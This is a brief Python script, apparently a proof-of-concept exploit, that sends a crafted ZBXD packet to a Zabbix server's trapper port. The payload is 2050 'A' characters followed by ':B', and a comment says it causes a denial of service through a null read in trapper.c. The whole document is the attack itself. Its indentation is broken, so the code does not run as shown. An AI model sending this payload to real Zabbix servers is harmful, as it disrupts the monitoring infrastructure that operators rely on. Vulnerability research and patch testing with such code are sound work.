#!/usr/bin/python

PORT = 10051
HOST = "192.168.2.89"

import socket
import struct

try:
        socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.settimeout(3)
        socket.connect((HOST, PORT))

        header = 'ZBXD\x01'

# DoS in ./src/zabbix_server/trapper/trapper.c
# If first ":" is after 2047 => DoS when reading NULL+1
data = 'A'*2050 + ':B'

size = struct.pack('q', len(data))
socket.send(header + size + data)
        rcvdata = socket.recv(10240)
print rcvdata
except:
        print "FAIL"

socket.close() 